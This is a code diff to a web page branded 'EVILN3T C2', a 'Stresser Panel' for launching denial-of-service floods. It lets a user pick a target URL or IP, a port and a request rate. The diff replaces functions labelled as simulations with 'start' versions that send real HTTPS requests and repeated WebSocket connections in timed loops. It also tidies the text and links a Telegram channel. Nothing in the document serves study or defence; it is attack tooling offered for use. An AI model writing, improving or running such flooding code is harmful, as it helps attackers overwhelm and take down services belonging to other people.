@@ -72,7 +72,7 @@
 </head>
 <body>
     <h1>EVILN3T C2</h1>
-    <p>Welcome To Stresser Pannel , enjoy </p>
+    <p>Welcome To Stresser Panel, enjoy!</p>
 
     <div class="container">
         <!-- Attack Options -->
@@ -122,20 +122,21 @@
             if (attackType === 'HTTPS') {
                 statusText = `Starting HTTPS attack on URL: ${target}:${port} with ${requestRate} requests per second...`;
                 document.getElementById('status').textContent = statusText;
-                simulateHttpsAttack(target, port, requestRate);
+                startHttpsAttack(target, port, requestRate);
             } else if (attackType === 'TCP') {
                 statusText = `Starting TCP attack on IP: ${target}:${port} with ${requestRate} packets per second...`;
                 document.getElementById('status').textContent = statusText;
-                simulateTcpAttack(target, port, requestRate);
+                startTcpAttack(target, port, requestRate);
             }
         }
 
-        // Simulate HTTPS attack (send HTTP requests)
-        function simulateHttpsAttack(url, port, rate) {
+        // Function to send HTTPS requests
+        function startHttpsAttack(url, port, rate) {
             let count = 0;
             let interval = setInterval(() => {
                 for (let i = 0; i < rate; i++) {
-                    fetch(`https://${url}:${port}`, { method: 'GATEWAY' })
+                    // Send HTTPS request
+                    fetch(`https://${url}:${port}`)
                         .then(response => {
                             console.log('HTTPS request sent to:', url);
                         })
@@ -148,13 +149,14 @@
             }, 1000); // Sends requests every second
         }
 
-        // Simulate TCP attack (send TCP packets)
-        function simulateTcpAttack(ip, port, rate) {
+        // Function to send TCP packets using WebSockets
+        function startTcpAttack(ip, port, rate) {
             let count = 0;
             let interval = setInterval(() => {
                 for (let i = 0; i < rate; i++) {
                     let socket = new WebSocket(`ws://${ip}:${port}`);
                     socket.onopen = () => {
+                        // Send a request using WebSocket (mimicking a TCP packet)
                         socket.send("GET / HTTP/1.1\r\nHost: " + ip + "\r\n\r\n");
                         console.log(`Sent TCP packet to ${ip}:${port}`);
                     };
@@ -167,6 +169,6 @@
             }, 1000); // Sends packets every second
         }
     </script>
-    <center><img src="https://j.top4top.io/p_3268bu5gk1.png" width="550" height="350"><a href="https://t.me/evilnet0">Visit Us</a> </center>
+    <center><img src="https://j.top4top.io/p_3268bu5gk1.png" width="550" height="350"><a href="https://t.me/evilnet0">Visit Us</a></center>
 </body>
 </html>
